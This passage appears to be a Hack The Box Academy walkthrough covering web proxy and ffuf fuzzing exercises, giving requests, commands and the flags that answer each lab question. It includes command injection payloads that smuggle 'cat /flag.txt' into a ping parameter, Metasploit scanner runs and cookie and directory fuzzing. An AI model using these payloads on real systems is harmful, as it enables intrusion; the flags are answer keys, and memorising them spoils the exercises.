</span><span id="__span-316-13"><a id="__codelineno-316-13" name="__codelineno-316-13"></a>HTB{1n73rc3p73d_1n_7h3_m1ddl3}
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{1n73rc3p73d_1n_7h3_m1ddl3}</p>
<h3 id="repeating-requests">Repeating Requests</h3>
<p><strong>Try using request repeating to be able to quickly test commands. With that, try looking for the other flag.</strong></p>
<p>The request:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-317-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-317-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-317-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-317-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-317-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-317-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-317-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-317-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-317-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-317-10">10</a></span>
<span class="normal"><a href="#__codelineno-317-11">11</a></span>
<span class="normal"><a href="#__codelineno-317-12">12</a></span>
<span class="normal"><a href="#__codelineno-317-13">13</a></span>
<span class="normal"><a href="#__codelineno-317-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-317-1"><a id="__codelineno-317-1" name="__codelineno-317-1"></a>POST /ping HTTP/1.1
</span><span id="__span-317-2"><a id="__codelineno-317-2" name="__codelineno-317-2"></a>Host: 94.237.59.24:51204
</span><span id="__span-317-3"><a id="__codelineno-317-3" name="__codelineno-317-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
</span><span id="__span-317-4"><a id="__codelineno-317-4" name="__codelineno-317-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
</span><span id="__span-317-5"><a id="__codelineno-317-5" name="__codelineno-317-5"></a>Accept-Language: en-US,en;q=0.5
</span><span id="__span-317-6"><a id="__codelineno-317-6" name="__codelineno-317-6"></a>Accept-Encoding: gzip, deflate, br
</span><span id="__span-317-7"><a id="__codelineno-317-7" name="__codelineno-317-7"></a>Content-Type: application/x-www-form-urlencoded
</span><span id="__span-317-8"><a id="__codelineno-317-8" name="__codelineno-317-8"></a>Content-Length: 18
</span><span id="__span-317-9"><a id="__codelineno-317-9" name="__codelineno-317-9"></a>Origin: http://94.237.59.24:51204
</span><span id="__span-317-10"><a id="__codelineno-317-10" name="__codelineno-317-10"></a>Connection: close
</span><span id="__span-317-11"><a id="__codelineno-317-11" name="__codelineno-317-11"></a>Referer: http://94.237.59.24:51204/
</span><span id="__span-317-12"><a id="__codelineno-317-12" name="__codelineno-317-12"></a>Upgrade-Insecure-Requests: 1
</span><span id="__span-317-13"><a id="__codelineno-317-13" name="__codelineno-317-13"></a>
</span><span id="__span-317-14"><a id="__codelineno-317-14" name="__codelineno-317-14"></a>ip=1;cat /flag.txt
</span></code></pre></div></td></tr></table></div>
<p>The response:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-318-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-318-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-318-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-318-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-318-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-318-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-318-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-318-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-318-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-318-10">10</a></span>
<span class="normal"><a href="#__codelineno-318-11">11</a></span>
<span class="normal"><a href="#__codelineno-318-12">12</a></span>
<span class="normal"><a href="#__codelineno-318-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-318-1"><a id="__codelineno-318-1" name="__codelineno-318-1"></a>HTTP/1.1 200 OK
</span><span id="__span-318-2"><a id="__codelineno-318-2" name="__codelineno-318-2"></a>X-Powered-By: Express
</span><span id="__span-318-3"><a id="__codelineno-318-3" name="__codelineno-318-3"></a>Date: Sun, 20 Oct 2024 18:37:28 GMT
</span><span id="__span-318-4"><a id="__codelineno-318-4" name="__codelineno-318-4"></a>Connection: close
</span><span id="__span-318-5"><a id="__codelineno-318-5" name="__codelineno-318-5"></a>Content-Length: 283
</span><span id="__span-318-6"><a id="__codelineno-318-6" name="__codelineno-318-6"></a>
</span><span id="__span-318-7"><a id="__codelineno-318-7" name="__codelineno-318-7"></a>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
</span><span id="__span-318-8"><a id="__codelineno-318-8" name="__codelineno-318-8"></a>64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.034 ms
</span><span id="__span-318-9"><a id="__codelineno-318-9" name="__codelineno-318-9"></a>
</span><span id="__span-318-10"><a id="__codelineno-318-10" name="__codelineno-318-10"></a>--- 127.0.0.1 ping statistics ---
</span><span id="__span-318-11"><a id="__codelineno-318-11" name="__codelineno-318-11"></a>1 packets transmitted, 1 received, 0% packet loss, time 0ms
</span><span id="__span-318-12"><a id="__codelineno-318-12" name="__codelineno-318-12"></a>rtt min/avg/max/mdev = 0.034/0.034/0.034/0.000 ms
</span><span id="__span-318-13"><a id="__codelineno-318-13" name="__codelineno-318-13"></a>HTB{qu1ckly_r3p3471n6_r3qu3575}
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{qu1ckly_r3p3471n6_r3qu3575}</p>
<h3 id="encodingdecoding">Encoding/Decoding</h3>
<p>Question. </p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-319-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-319-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-319-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-319-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-319-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-319-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-319-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-319-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-319-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-319-10">10</a></span>
<span class="normal"><a href="#__codelineno-319-11">11</a></span>
<span class="normal"><a href="#__codelineno-319-12">12</a></span>
<span class="normal"><a href="#__codelineno-319-13">13</a></span>
<span class="normal"><a href="#__codelineno-319-14">14</a></span>
<span class="normal"><a href="#__codelineno-319-15">15</a></span>
<span class="normal"><a href="#__codelineno-319-16">16</a></span>
<span class="normal"><a href="#__codelineno-319-17">17</a></span>
<span class="normal"><a href="#__codelineno-319-18">18</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-319-1"><a id="__codelineno-319-1" name="__codelineno-319-1"></a># The provided file contains the text:
</span><span id="__span-319-2"><a id="__codelineno-319-2" name="__codelineno-319-2"></a>VTJ4U1VrNUZjRlZXVkVKTFZrWkdOVk5zVW10aFZYQlZWRmh3UzFaR2NITlRiRkphWld0d1ZWUllaRXRXUm10M1UyeFNUbVZGY0ZWWGJYaExWa1V3ZVZOc1VsZGlWWEJWVjIxNFMxWkZNVFJUYkZKaFlrVndWVmR0YUV0V1JUQjNVMnhTYTJGM1BUMD0=
</span><span id="__span-319-3"><a id="__codelineno-319-3" name="__codelineno-319-3"></a>
</span><span id="__span-319-4"><a id="__codelineno-319-4" name="__codelineno-319-4"></a># It is base64 text. You need to decode in base64 4 times until getting an url encoded. First:
</span><span id="__span-319-5"><a id="__codelineno-319-5" name="__codelineno-319-5"></a>cat encoded_flag.txt | base64 -d | tee encoded2.txt
</span><span id="__span-319-6"><a id="__codelineno-319-6" name="__codelineno-319-6"></a># U2xSUk5FcFVWVEJLVkZGNVNsUmthVXBVVFhwS1ZGcHNTbFJaZWtwVVRYZEtWRmt3U2xSTmVFcFVXbXhLVkUweVNsUldiVXBVV214S1ZFMTRTbFJhYkVwVVdtaEtWRTB3U2xSa2F3PT0=
</span><span id="__span-319-7"><a id="__codelineno-319-7" name="__codelineno-319-7"></a>
</span><span id="__span-319-8"><a id="__codelineno-319-8" name="__codelineno-319-8"></a>cat encoded2.txt | base64 -d | tee encoded3.txt
</span><span id="__span-319-9"><a id="__codelineno-319-9" name="__codelineno-319-9"></a># SlRRNEpUVTBKVFF5SlRkaUpUTXpKVFpsSlRZekpUTXdKVFkwSlRNeEpUWmxKVE0ySlRWbUpUWmxKVE14SlRabEpUWmhKVE0wSlRkaw==
</span><span id="__span-319-10"><a id="__codelineno-319-10" name="__codelineno-319-10"></a>
</span><span id="__span-319-11"><a id="__codelineno-319-11" name="__codelineno-319-11"></a>cat encoded3.txt | base64 -d | tee encoded4.txt
</span><span id="__span-319-12"><a id="__codelineno-319-12" name="__codelineno-319-12"></a># JTQ4JTU0JTQyJTdiJTMzJTZlJTYzJTMwJTY0JTMxJTZlJTM2JTVmJTZlJTMxJTZlJTZhJTM0JTdk
</span><span id="__span-319-13"><a id="__codelineno-319-13" name="__codelineno-319-13"></a>
</span><span id="__span-319-14"><a id="__codelineno-319-14" name="__codelineno-319-14"></a>cat encoded4.txt | base64 -d | tee encoded5.txt
</span><span id="__span-319-15"><a id="__codelineno-319-15" name="__codelineno-319-15"></a># %48%54%42%7b%33%6e%63%30%64%31%6e%36%5f%6e%31%6e%6a%34%7d
</span><span id="__span-319-16"><a id="__codelineno-319-16" name="__codelineno-319-16"></a>
</span><span id="__span-319-17"><a id="__codelineno-319-17" name="__codelineno-319-17"></a># Enter it in Decoder in Burpsuite 
</span><span id="__span-319-18"><a id="__codelineno-319-18" name="__codelineno-319-18"></a>HTB{3nc0d1n6_n1nj4}
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{3nc0d1n6_n1nj4}</p>
<h3 id="proxying-tools">Proxying Tools</h3>
<p>Question. 
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-320-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-320-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-320-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-320-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-320-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-320-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-320-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-320-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-320-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-320-10">10</a></span>
<span class="normal"><a href="#__codelineno-320-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-320-1"><a id="__codelineno-320-1" name="__codelineno-320-1"></a># Start metasploit
</span><span id="__span-320-2"><a id="__codelineno-320-2" name="__codelineno-320-2"></a>msfconsole -q
</span><span id="__span-320-3"><a id="__codelineno-320-3" name="__codelineno-320-3"></a>
</span><span id="__span-320-4"><a id="__codelineno-320-4" name="__codelineno-320-4"></a># Then, to set a proxy for any exploit within Metasploitwith the `set PROXIES` flag. 
</span><span id="__span-320-5"><a id="__codelineno-320-5" name="__codelineno-320-5"></a>set PROXIES HTTP:127.0.0.1:8080
</span><span id="__span-320-6"><a id="__codelineno-320-6" name="__codelineno-320-6"></a>
</span><span id="__span-320-7"><a id="__codelineno-320-7" name="__codelineno-320-7"></a>use auxiliary/scanner/http/http_put
</span><span id="__span-320-8"><a id="__codelineno-320-8" name="__codelineno-320-8"></a>
</span><span id="__span-320-9"><a id="__codelineno-320-9" name="__codelineno-320-9"></a>set RHOSTS https://academy.hackthebox.com/
</span><span id="__span-320-10"><a id="__codelineno-320-10" name="__codelineno-320-10"></a>
</span><span id="__span-320-11"><a id="__codelineno-320-11" name="__codelineno-320-11"></a>run
</span></code></pre></div></td></tr></table></div></p>
<p>Results: msf test file</p>
<h3 id="burp-intruder">Burp Intruder</h3>
<p><strong>Use Burp Intruder to fuzz for '.html' files under the /admin directory, to find a file containing the flag.</strong></p>
<p>This is the request</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-321-1">1</a></span>
<span class="normal"><a href="#__codelineno-321-2">2</a></span>
<span class="normal"><a href="#__codelineno-321-3">3</a></span>
<span class="normal"><a href="#__codelineno-321-4">4</a></span>
<span class="normal"><a href="#__codelineno-321-5">5</a></span>
<span class="normal"><a href="#__codelineno-321-6">6</a></span>
<span class="normal"><a href="#__codelineno-321-7">7</a></span>
<span class="normal"><a href="#__codelineno-321-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-321-1"><a id="__codelineno-321-1" name="__codelineno-321-1"></a>GET /admin/§flag§.html HTTP/1.1
</span><span id="__span-321-2"><a id="__codelineno-321-2" name="__codelineno-321-2"></a>Host: 94.237.59.246:39867
</span><span id="__span-321-3"><a id="__codelineno-321-3" name="__codelineno-321-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
</span><span id="__span-321-4"><a id="__codelineno-321-4" name="__codelineno-321-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
</span><span id="__span-321-5"><a id="__codelineno-321-5" name="__codelineno-321-5"></a>Accept-Language: en-US,en;q=0.5
</span><span id="__span-321-6"><a id="__codelineno-321-6" name="__codelineno-321-6"></a>Accept-Encoding: gzip, deflate, br
</span><span id="__span-321-7"><a id="__codelineno-321-7" name="__codelineno-321-7"></a>Connection: close
</span><span id="__span-321-8"><a id="__codelineno-321-8" name="__codelineno-321-8"></a>Upgrade-Insecure-Requests: 1
</span></code></pre></div></td></tr></table></div>
<p>In Burp Intruder set a Snipper attack. Use common.txt as payload. Run it and payload 2010 will return the flag.</p>
<p>Results: HTB{burp_1n7rud3r_fuzz3r!}</p>
<h3 id="zap-fuzzer">ZAP Fuzzer</h3>
<p><strong>The directory we found above sets the cookie to the md5 hash of the username, as we can see the md5 cookie in the request for the (guest) user. Visit '/skills/' to get a request with a cookie, then try to use ZAP Fuzzer to fuzz the cookie for different md5 hashed usernames to get the flag. Use the "top-usernames-shortlist.txt" wordlist from Seclists.</strong></p>
<p>Results: HTB{fuzz1n6_my_f1r57_c00k13}</p>
<h3 id="zap-scanner">ZAP Scanner</h3>
<p><strong>Run ZAP Scanner on the target above to identify directories and potential vulnerabilities. Once you find the high-level vulnerability, try to use it to read the flag at '/flag.txt'</strong>. </p>
<p>The vulnerable endpoint contains a command injection vulnerability. This is the request: </p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-322-1">1</a></span>
<span class="normal"><a href="#__codelineno-322-2">2</a></span>
<span class="normal"><a href="#__codelineno-322-3">3</a></span>
<span class="normal"><a href="#__codelineno-322-4">4</a></span>
<span class="normal"><a href="#__codelineno-322-5">5</a></span>
<span class="normal"><a href="#__codelineno-322-6">6</a></span>
<span class="normal"><a href="#__codelineno-322-7">7</a></span>
<span class="normal"><a href="#__codelineno-322-8">8</a></span>
<span class="normal"><a href="#__codelineno-322-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-322-1"><a id="__codelineno-322-1" name="__codelineno-322-1"></a>GET /devtools/ping.php?ip=|+cat+/flag.txt HTTP/1.1
</span><span id="__span-322-2"><a id="__codelineno-322-2" name="__codelineno-322-2"></a>Host: 94.237.54.253:52356
</span><span id="__span-322-3"><a id="__codelineno-322-3" name="__codelineno-322-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
</span><span id="__span-322-4"><a id="__codelineno-322-4" name="__codelineno-322-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
</span><span id="__span-322-5"><a id="__codelineno-322-5" name="__codelineno-322-5"></a>Accept-Language: en-US,en;q=0.5
</span><span id="__span-322-6"><a id="__codelineno-322-6" name="__codelineno-322-6"></a>Accept-Encoding: gzip, deflate, br
</span><span id="__span-322-7"><a id="__codelineno-322-7" name="__codelineno-322-7"></a>Connection: close
</span><span id="__span-322-8"><a id="__codelineno-322-8" name="__codelineno-322-8"></a>Referer: http://94.237.54.253:52356/index.php/2021/08/11/customer-support/
</span><span id="__span-322-9"><a id="__codelineno-322-9" name="__codelineno-322-9"></a>Upgrade-Insecure-Requests: 1
</span></code></pre></div></td></tr></table></div>
<p>And this is the response:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-323-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-323-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-323-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-323-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-323-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-323-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-323-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-323-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-323-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-323-10">10</a></span>
<span class="normal"><a href="#__codelineno-323-11">11</a></span>
<span class="normal"><a href="#__codelineno-323-12">12</a></span>
<span class="normal"><a href="#__codelineno-323-13">13</a></span>
<span class="normal"><a href="#__codelineno-323-14">14</a></span>
<span class="normal"><a href="#__codelineno-323-15">15</a></span>
<span class="normal"><a href="#__codelineno-323-16">16</a></span>
<span class="normal"><a href="#__codelineno-323-17">17</a></span>
<span class="normal"><a href="#__codelineno-323-18">18</a></span>
<span class="normal"><a href="#__codelineno-323-19">19</a></span>
<span class="normal"><a href="#__codelineno-323-20">20</a></span>
<span class="normal"><a href="#__codelineno-323-21">21</a></span>
<span class="normal"><a href="#__codelineno-323-22">22</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-323-1"><a id="__codelineno-323-1" name="__codelineno-323-1"></a>HTTP/1.1 200 OK
</span><span id="__span-323-2"><a id="__codelineno-323-2" name="__codelineno-323-2"></a>Date: Tue, 22 Oct 2024 16:54:31 GMT
</span><span id="__span-323-3"><a id="__codelineno-323-3" name="__codelineno-323-3"></a>Server: Apache/2.4.41 (Ubuntu)
</span><span id="__span-323-4"><a id="__codelineno-323-4" name="__codelineno-323-4"></a>Vary: Accept-Encoding
</span><span id="__span-323-5"><a id="__codelineno-323-5" name="__codelineno-323-5"></a>Content-Length: 156
</span><span id="__span-323-6"><a id="__codelineno-323-6" name="__codelineno-323-6"></a>Connection: close
</span><span id="__span-323-7"><a id="__codelineno-323-7" name="__codelineno-323-7"></a>Content-Type: text/html; charset=UTF-8
</span><span id="__span-323-8"><a id="__codelineno-323-8" name="__codelineno-323-8"></a>
</span><span id="__span-323-9"><a id="__codelineno-323-9" name="__codelineno-323-9"></a>&lt;!DOCTYPE html&gt;
</span><span id="__span-323-10"><a id="__codelineno-323-10" name="__codelineno-323-10"></a>
</span><span id="__span-323-11"><a id="__codelineno-323-11" name="__codelineno-323-11"></a>&lt;html lang=&quot;en&quot;&gt;
</span><span id="__span-323-12"><a id="__codelineno-323-12" name="__codelineno-323-12"></a>
</span><span id="__span-323-13"><a id="__codelineno-323-13" name="__codelineno-323-13"></a>&lt;head&gt;
</span><span id="__span-323-14"><a id="__codelineno-323-14" name="__codelineno-323-14"></a>  &lt;meta charset=&quot;UTF-8&quot;&gt;
</span><span id="__span-323-15"><a id="__codelineno-323-15" name="__codelineno-323-15"></a>  &lt;title&gt;Ping&lt;/title&gt;
</span><span id="__span-323-16"><a id="__codelineno-323-16" name="__codelineno-323-16"></a>&lt;/head&gt;
</span><span id="__span-323-17"><a id="__codelineno-323-17" name="__codelineno-323-17"></a>
</span><span id="__span-323-18"><a id="__codelineno-323-18" name="__codelineno-323-18"></a>&lt;body&gt;
</span><span id="__span-323-19"><a id="__codelineno-323-19" name="__codelineno-323-19"></a>  HTB{5c4nn3r5_f1nd_vuln5_w3_m155}
</span><span id="__span-323-20"><a id="__codelineno-323-20" name="__codelineno-323-20"></a>&lt;/body&gt;
</span><span id="__span-323-21"><a id="__codelineno-323-21" name="__codelineno-323-21"></a>
</span><span id="__span-323-22"><a id="__codelineno-323-22" name="__codelineno-323-22"></a>&lt;/html&gt;
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{5c4nn3r5_f1nd_vuln5_w3_m155}</p>
<h3 id="skills-assessment-using-web-proxies">Skills Assessment - Using Web Proxies</h3>
<p><strong>The /lucky.php page has a button that appears to be disabled. Try to enable the button, and then click it to get the flag.</strong>. </p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-324-1">1</a></span>
<span class="normal"><a href="#__codelineno-324-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-324-1"><a id="__codelineno-324-1" name="__codelineno-324-1"></a># Intercept traffic qith Burpsuite. Go to the website http://$ip:$port/lucky.php and remove in source code &quot;disabled=&quot;&quot;&quot;. Then click on the button. You will get a POST request to lucky.php in your intercepted traffic. Send it to Repeater module. Click on Send. Within the response, you will see:
</span><span id="__span-324-2"><a id="__codelineno-324-2" name="__codelineno-324-2"></a>&lt;p style=&quot;text-align:center&quot;&gt;HTB{d154bl3d_bu770n5_w0n7_570p_m3}&lt;/p&gt;
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{d154bl3d_bu770n5_w0n7_570p_m3}</p>
<p>The /admin.php page uses a cookie that has been encoded multiple times. Try to decode the cookie until you get a value with 31-characters. Submit the value as the answer.. </p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-325-1">1</a></span>
<span class="normal"><a href="#__codelineno-325-2">2</a></span>
<span class="normal"><a href="#__codelineno-325-3">3</a></span>
<span class="normal"><a href="#__codelineno-325-4">4</a></span>
<span class="normal"><a href="#__codelineno-325-5">5</a></span>
<span class="normal"><a href="#__codelineno-325-6">6</a></span>
<span class="normal"><a href="#__codelineno-325-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-325-1"><a id="__codelineno-325-1" name="__codelineno-325-1"></a>#  Intercept traffic qith Burpsuite. Go to the website http://$ip:$port/admin.php. See the &quot;Set-Cookie: cookie=4d325268597a6b7a596a686a5a4449314d4746684f474d7859544d325a6d5a6d597a63355954453359513d3d&quot;
</span><span id="__span-325-2"><a id="__codelineno-325-2" name="__codelineno-325-2"></a>
</span><span id="__span-325-3"><a id="__codelineno-325-3" name="__codelineno-325-3"></a># Use Decoder. First, decode as ASCII hex, you will get:
</span><span id="__span-325-4"><a id="__codelineno-325-4" name="__codelineno-325-4"></a>M2RhYzkzYjhjZDI1MGFhOGMxYTM2ZmZmYzc5YTE3YQ==
</span><span id="__span-325-5"><a id="__codelineno-325-5" name="__codelineno-325-5"></a>
</span><span id="__span-325-6"><a id="__codelineno-325-6" name="__codelineno-325-6"></a># Use Decoder. Second, decode as Base64, you will get:
</span><span id="__span-325-7"><a id="__codelineno-325-7" name="__codelineno-325-7"></a>3dac93b8cd250aa8c1a36fffc79a17a
</span></code></pre></div></td></tr></table></div>
<p>Results: 3dac93b8cd250aa8c1a36fffc79a17a</p>
<p><strong>Once you decode the cookie, you will notice that it is only 31 characters long, which appears to be an md5 hash missing its last character. So, try to fuzz the last character of the decoded md5 cookie with all alpha-numeric characters, while encoding each request with the encoding methods you identified above. (You may use the "alphanum-case.txt" wordlist from Seclist for the payload).</strong> </p>
<p><img alt="" src="../img/proxy_00.png" /></p>
<p><img alt="" src="../img/proxy_01.png" /></p>
<p>Results:            HTB{burp_1n7rud3r_n1nj4!}</p>
<p><strong>You are using the 'auxiliary/scanner/http/coldfusion_locale_traversal' tool within Metasploit, but it is not working properly for you. You decide to capture the request sent by Metasploit so you can manually verify it and repeat it. Once you capture the request, what is the 'XXXXX' directory being called in '/XXXXX/administrator/..'?</strong>. </p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-326-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-326-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-326-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-326-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-326-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-326-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-326-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-326-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-326-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-326-10">10</a></span>
<span class="normal"><a href="#__codelineno-326-11">11</a></span>
<span class="normal"><a href="#__codelineno-326-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-326-1"><a id="__codelineno-326-1" name="__codelineno-326-1"></a>msfconsole -q
</span><span id="__span-326-2"><a id="__codelineno-326-2" name="__codelineno-326-2"></a>use auxiliary/scanner/http/coldfusion_locale_traversal
</span><span id="__span-326-3"><a id="__codelineno-326-3" name="__codelineno-326-3"></a>options
</span><span id="__span-326-4"><a id="__codelineno-326-4" name="__codelineno-326-4"></a>set RHOSTS $ip
</span><span id="__span-326-5"><a id="__codelineno-326-5" name="__codelineno-326-5"></a>set RPORT $port
</span><span id="__span-326-6"><a id="__codelineno-326-6" name="__codelineno-326-6"></a>set PROXIES HTTP:127.0.0.1:8080
</span><span id="__span-326-7"><a id="__codelineno-326-7" name="__codelineno-326-7"></a>
</span><span id="__span-326-8"><a id="__codelineno-326-8" name="__codelineno-326-8"></a># Go to Burpsuite and check out the request
</span><span id="__span-326-9"><a id="__codelineno-326-9" name="__codelineno-326-9"></a>GET /CFIDE/administrator/index.cfm HTTP/1.1
</span><span id="__span-326-10"><a id="__codelineno-326-10" name="__codelineno-326-10"></a>Host: 94.237.62.154:37883
</span><span id="__span-326-11"><a id="__codelineno-326-11" name="__codelineno-326-11"></a>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0
</span><span id="__span-326-12"><a id="__codelineno-326-12" name="__codelineno-326-12"></a>Connection: close
</span></code></pre></div></td></tr></table></div>
<p>Results: CFIDE</p>
<h2 id="attacking-web-applications-with-ffuf"><a href="https://academy.hackthebox.com/module/details/54">Attacking Web Applications with Ffuf</a></h2>
<h3 id="basic-fuzzing">Basic Fuzzing</h3>
<h4 id="directory-fuzzing">Directory fuzzing</h4>
<p><strong>In addition to the directory we found above, there is another directory that can be found. What is it?</strong></p>
<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-327-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-327-1"><a id="__codelineno-327-1" name="__codelineno-327-1"></a><span class="go">ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  -u http://$ip:$port/FUZZ</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: forum</p>
<h4 id="page-fuzzing">Page fuzzing</h4>
<p><strong>Try to use what you learned in this section to fuzz the '/blog' directory and find all pages. One of them should contain a flag. What is the flag?.</strong></p>
<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-328-1">1</a></span>
<span class="normal"><a href="#__codelineno-328-2">2</a></span>
<span class="normal"><a href="#__codelineno-328-3">3</a></span>
<span class="normal"><a href="#__codelineno-328-4">4</a></span>
<span class="normal"><a href="#__codelineno-328-5">5</a></span>
<span class="normal"><a href="#__codelineno-328-6">6</a></span>
<span class="normal"><a href="#__codelineno-328-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-328-1"><a id="__codelineno-328-1" name="__codelineno-328-1"></a><span class="gp"># </span>Find<span class="w"> </span>the<span class="w"> </span>extension<span class="w"> </span><span class="k">in</span><span class="w"> </span>use
</span><span id="__span-328-2"><a id="__codelineno-328-2" name="__codelineno-328-2"></a><span class="go">ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://$ip:$port/blog/indexFUZZ</span>
</span><span id="__span-328-3"><a id="__codelineno-328-3" name="__codelineno-328-3"></a>
</span><span id="__span-328-4"><a id="__codelineno-328-4" name="__codelineno-328-4"></a><span class="gp"># </span>As<span class="w"> </span>it<span class="w"> </span>is<span class="w"> </span>php,<span class="w"> </span>we<span class="w"> </span>will<span class="w"> </span>fuzz<span class="w"> </span>now<span class="w"> </span>possible<span class="w"> </span>existent<span class="w"> </span>files.php<span class="w"> </span>
</span><span id="__span-328-5"><a id="__codelineno-328-5" name="__codelineno-328-5"></a><span class="go">ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$ip:$port/blog/FUZZ.php</span>
</span><span id="__span-328-6"><a id="__codelineno-328-6" name="__codelineno-328-6"></a>
</span><span id="__span-328-7"><a id="__codelineno-328-7" name="__codelineno-328-7"></a><span class="gp"># </span>We<span class="w"> </span>obtain<span class="w"> </span>http://<span class="nv">$ip</span>:<span class="nv">$port</span>/blog/home.php
